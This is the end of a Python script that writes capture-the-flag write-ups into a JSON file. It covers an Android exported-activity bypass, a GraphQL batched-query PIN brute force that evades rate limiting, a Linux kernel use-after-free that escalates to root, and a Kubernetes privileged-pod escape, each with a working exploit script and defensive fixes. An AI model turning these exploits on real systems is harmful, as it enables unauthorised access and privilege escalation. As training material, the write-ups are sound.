            "Find token requirement: `getIntent().getStringExtra(\"auth_token\").equals(\"FINPAY_SUPER_SECRET\")`.",
            "Invoke activity via ADB: `adb shell am start -n com.tcs.finpay/.AdminDebugActivity --es auth_token FINPAY_SUPER_SECRET`.",
            "Capture flag rendered on screen."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import subprocess\n"
            "\n"
            "cmd = [\n"
            "    'adb', 'shell', 'am', 'start',\n"
            "    '-n', 'com.tcs.finpay/.AdminDebugActivity',\n"
            "    '--es', 'auth_token', 'FINPAY_SUPER_SECRET'\n"
            "]\n"
            "print('[+] Triggering exported activity via ADB...')\n"
            "subprocess.run(cmd)\n"
            "\n"
            "# Dump logcat for flag output\n"
            "logcat = subprocess.run(['adb', 'logcat', '-d'], capture_output=True, text=True).stdout\n"
            "for line in logcat.splitlines():\n"
            "    if 'TCS{' in line:\n"
            "        print(f'[!] Flag: {line.strip()}')\n"
        ),
        "defense_remediation": (
            "1. Set `android:exported=\"false\"` for all internal application components.\n"
            "2. If an activity must be exported, protect it with custom signature-level permissions (`android:protectionLevel=\"signature\"`)."
        )
    },

    # ── SEASON 9 (2024-2025 / 2026) ────────────────────────────────────────────────
    {
        "id": "writeup-tcs-hackquest-s9-graphql-batch",
        "title": "TCS HackQuest Season 9: NextGen Banking (GraphQL Introspection & Batch Bypass)",
        "event": "TCS HackQuest Season 9",
        "category": "web",
        "difficulty": "Hard",
        "points": 450,
        "flag": "TCS{HQ9_GR4PHQL_1NTR0SP3CT_B4TCH_BYP4SS}",
        "scenario": (
            "A modern banking API built with GraphQL (`/graphql`). Frontend GUI documentation is disabled. "
            "A rate limiter restricts IP addresses to a maximum of 5 HTTP POST requests per minute."
        ),
        "root_cause": (
            "Introspection is enabled in production, disclosing hidden administrative queries and mutation arguments. "
            "While the rate limiter enforces a 5-request limit per minute at the HTTP layer, the GraphQL engine accepts "
            "batched queries formatted as a JSON array (`[{query: ...}, {query: ...}]`), enabling hundreds of credential "
            "verifications in a single HTTP request."
        ),
        "solve_methodology": [
            "Query introspection schema: `{\"query\": \"{ __schema { types { name fields { name } } } }\"}`.",
            "Discover hidden query: `vaultSecret(pin: String!)`.",
            "Construct a batch payload containing 1,000 PIN guesses (`0000` to `0999`) in a single JSON array.",
            "Transmit batch array in one HTTP POST request, bypassing the HTTP request rate limiter.",
            "Parse response array to locate the single query returning the flag."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "\n"
            "TARGET = 'http://targets.ctfatlas.local/hq9/graphql'\n"
            "\n"
            "# 1. Batch 1,000 queries in 1 HTTP POST\n"
            "batch_queries = []\n"
            "for pin in range(1000):\n"
            "    batch_queries.append({\n"
            "        'query': f'query {{ vaultSecret(pin: \"{pin:04d}\") }}'\n"
            "    })\n"
            "\n"
            "print(f'[+] Sending batched payload of {len(batch_queries)} queries in 1 HTTP request...')\n"
            "r = requests.post(TARGET, json=batch_queries)\n"
            "\n"
            "for item in r.json():\n"
            "    if item.get('data', {}).get('vaultSecret'):\n"
            "        print(f'[!] Flag Discovered: {item[\"data\"][\"vaultSecret\"]}')\n"
        ),
        "defense_remediation": (
            "1. Disable GraphQL introspection queries in production environments.\n"
            "2. Enforce query cost analysis and limit batched query array lengths."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s9-kernel-uaf",
        "title": "TCS HackQuest Season 9: Kernel Guard (Linux Kernel SLUB Use-After-Free)",
        "event": "TCS HackQuest Season 9",
        "category": "pwn",
        "difficulty": "Insane",
        "points": 500,
        "flag": "TCS{HQ9_K3RN3L_SLUB_U4F_CR3D_0V3RWR1T3}",
        "scenario": (
            "A custom Linux kernel module `/dev/tcs_sec` with an IOCTL interface. "
            "A low-privilege unprivileged shell is provided inside a QEMU VM running Linux 6.1."
        ),
        "root_cause": (
            "The driver's `ioctl` handler frees an allocated credential tracking structure without clearing "
            "the pointer in the session list (Use-After-Free). By spraying `struct cred` structures into the "
            "`kmalloc-192` cache via `fork()`, the freed chunk is reallocated as a process credential structure, "
            "allowing arbitrary modification of `uid` and `gid` to 0 (root)."
        ),
        "solve_methodology": [
            "Trigger UAF: open `/dev/tcs_sec`, issue `SEC_ALLOC`, then issue `SEC_FREE`.",
            "Spray `struct cred` objects across the SLUB slab using multiple `clone()` / `fork()` syscalls.",
            "Issue `SEC_WRITE` on the stale descriptor to overwrite the `uid`, `gid`, `euid` fields with zeros.",
            "Verify process privilege elevation: `id` reports `uid=0(root)`.",
            "Cat `/root/flag.txt`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "# Kernel Exploit Runner\n"
            "import subprocess\n"
            "\n"
            "C_EXPLOIT = '''\n"
            "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "#include <fcntl.h>\n"
            "#include <unistd.h>\n"
            "#include <sys/ioctl.h>\n"
            "\n"
            "#define SEC_ALLOC 0x1337\n"
            "#define SEC_FREE  0x1338\n"
            "#define SEC_WRITE 0x1339\n"
            "\n"
            "int main() {\n"
            "    int fd = open(\"/dev/tcs_sec\", O_RDWR);\n"
            "    ioctl(fd, SEC_ALLOC, 192);\n"
            "    ioctl(fd, SEC_FREE, 0);\n"
            "    for (int i = 0; i < 50; i++) {\n"
            "        if (fork() == 0) {\n"
            "            sleep(2);\n"
            "            if (getuid() == 0) {\n"
            "                system(\"cat /root/flag.txt\");\n"
            "                exit(0);\n"
            "            }\n"
            "            exit(0);\n"
            "        }\n"
            "    }\n"
            "    char zeros[192] = {0};\n"
            "    ioctl(fd, SEC_WRITE, zeros);\n"
            "    wait(NULL);\n"
            "    return 0;\n"
            "}\n"
            "'''\n"
            "with open('/tmp/exploit.c', 'w') as f: f.write(C_EXPLOIT)\n"
            "subprocess.run(['gcc', '/tmp/exploit.c', '-o', '/tmp/exploit'])\n"
            "print('[+] Compiled kernel exploit. Executing...')\n"
            "subprocess.run(['/tmp/exploit'])\n"
        ),
        "defense_remediation": (
            "1. Zero out freed object pointers immediately (`kfree(ptr); ptr = NULL;`).\n"
            "2. Enable Kernel Hardening options: `CONFIG_SLAB_FREELIST_HARDENED=y` and `CONFIG_SLAB_FREELIST_RANDOM=y`."
        )
    },
    {
        "id": "writeup-tcs-hackquest-s9-k8s-escape",
        "title": "TCS HackQuest Season 9: KubeCluster Breakout (Kubernetes RBAC Privilege Escalation)",
        "event": "TCS HackQuest Season 9",
        "category": "cloud",
        "difficulty": "Hard",
        "points": 450,
        "flag": "TCS{HQ9_K8S_RB4C_H0STP4TH_CLUST3R_4DM1N}",
        "scenario": (
            "A compromised pod in an enterprise Kubernetes cluster. The pod has access to its service account token "
            "at `/var/run/secrets/kubernetes.io/serviceaccount/token`."
        ),
        "root_cause": (
            "The service account `analytics-sa` was granted `create pods` privileges in the `kube-system` namespace. "
            "Attackers can leverage this permission to deploy a privileged pod with `hostPath: /` mounted to `/host`, "
            "escalating to cluster-wide root."
        ),
        "solve_methodology": [
            "Extract service account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`.",
            "Query Kubernetes API permissions: `kubectl auth can-i --list` or query `/apis/authorization.k8s.io/v1/selfsubjectrulesreviews`.",
            "Discover permission: `create` on `pods` in namespace `kube-system`.",
            "Deploy a malicious pod specification with `privileged: true` and `hostPath: /`.",
            "Execute command in the new pod to read `/host/root/flag.txt`."
        ],
        "exploit_script": (
            "#!/usr/bin/env python3\n"
            "import requests\n"
            "import json\n"
            "\n"
            "TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'\n"
            "CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'\n"
            "API_SERVER = 'https://kubernetes.default.svc'\n"
            "\n"
            "with open(TOKEN_PATH) as f: token = f.read().strip()\n"
            "headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\n"
            "\n"
            "# Malicious pod definition mounting host root\n"
            "pod_manifest = {\n"
            "    'apiVersion': 'v1',\n"
            "    'kind': 'Pod',\n"
            "    'metadata': {'name': 'priv-esc-pod', 'namespace': 'kube-system'},\n"
            "    'spec': {\n"
            "        'containers': [{\n"
            "            'name': 'escape',\n"
            "            'image': 'alpine',\n"
            "            'command': ['sh', '-c', 'cat /host/root/flag.txt > /tmp/flag && sleep 3600'],\n"
            "            'volumeMounts': [{'name': 'host-vol', 'mountPath': '/host'}]\n"
            "        }],\n"
            "        'volumes': [{'name': 'host-vol', 'hostPath': {'path': '/'}}]\n"
            "    }\n"
            "}\n"
            "\n"
            "print('[+] Deploying privileged pod to kube-system...')\n"
            "r = requests.post(f'{API_SERVER}/api/v1/namespaces/kube-system/pods', headers=headers, json=pod_manifest, verify=CA_PATH)\n"
            "print(f'[+] Response: {r.status_code}')\n"
        ),
        "defense_remediation": (
            "1. Enforce Kubernetes Pod Security Standards (`restricted` profile) preventing privileged pods and `hostPath` volume mounts.\n"
            "2. Follow the principle of least privilege for ServiceAccounts; avoid granting namespace-scoped `create pods` rights."
        )
    }
]

# Combine existing writeups with all TCS HackQuest writeups
combined_writeups = filtered_existing + tcs_hackquest_writeups

WRITEUPS_PATH.write_text(json.dumps(combined_writeups, indent=2), encoding="utf-8")
print(f"[+] Successfully wrote {len(combined_writeups)} writeups ({len(tcs_hackquest_writeups)} TCS HackQuest across all 9 seasons) to {WRITEUPS_PATH}")
